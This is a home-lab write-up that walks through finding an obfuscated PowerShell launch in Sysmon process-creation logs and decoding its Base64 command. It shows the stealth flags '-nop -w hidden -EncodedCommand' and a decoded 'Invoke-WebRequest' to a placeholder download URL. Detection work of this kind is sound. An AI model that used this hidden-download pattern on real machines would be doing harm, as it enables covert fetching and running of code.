# Step 3: Investigating the Obfuscated PowerShell Attack

## Goal

To investigate suspicious PowerShell activity using **Sysmon logs** captured in **Event Viewer**, and identify signs of obfuscation and remote script execution.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Sysmon | Collected detailed process execution data |
| Event Viewer | Viewed raw event logs from Sysmon |
| Base64 Decoder (online/CyberChef) | Decoded the obfuscated command |



## 🔍 Where to Find the Logs

1. Open **Event Viewer**
2. Navigate to: 
    Applications and Services Logs --> Microsoft --> Windows --> Sysmon --> Operational
3. Filter for:
   - **Event ID 1** (Process Creation)


## Key Fields in Sysmon Event ID 1

| Field | Explanation |
|-------|-------------|
| `Image` | Full path to executed binary (`powershell.exe`) |
| `CommandLine` | Full command that was executed (includes `-EncodedCommand`) |
| `ParentImage` | What launched PowerShell (could be explorer.exe, cmd.exe, etc.) |
| `User` | Account that ran the command |
| `UtcTime` | Time of execution |
| `Hashes` | MD5/SHA256 hash of the binary |



## What We Observed

| Field | Value |
|-------|-------|
| Image | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| CommandLine | `-nop -w hidden -EncodedCommand SQBuAHYAbw...` |
| User | `DESKTOP-5NGOGNV\bsach` |
| ParentImage | Another PowerShell instance |
| IntegrityLevel | High |
| Time | `2025-03-24 21:18:40` |

>  **Suspicious Behavior Identified**:  
PowerShell was executed **with obfuscation flags** and a **Base64-encoded payload**, attempting a hidden `Invoke-WebRequest`.



## Decoding the Command

Used [CyberChef](https://gchq.github.io/CyberChef/) or [base64decode.org](https://www.base64decode.org/) with **UTF-16LE** encoding to decode the payload:

powershell
    Invoke-WebRequest "http://emock/downloadscript"


## Analysis Summary

PowerShell was launched in a stealthy manner:
    -nop disables profiles
    -w hidden hides the console
    -EncodedCommand hides the script
The command attempts to reach out to a remote URL -- a classic early-stage attack behavior (like downloading malware or tools).
This behavior is often used in phishing, LOLBin abuse, or hands-on-keyboard instrusions. 

## Outcome 

Successfully detected obfuscated PowerShell usage via Sysmon logging and confirmed its intent through manual decoding.
This sets the stage for centralized detection and alerting in Step 4. 

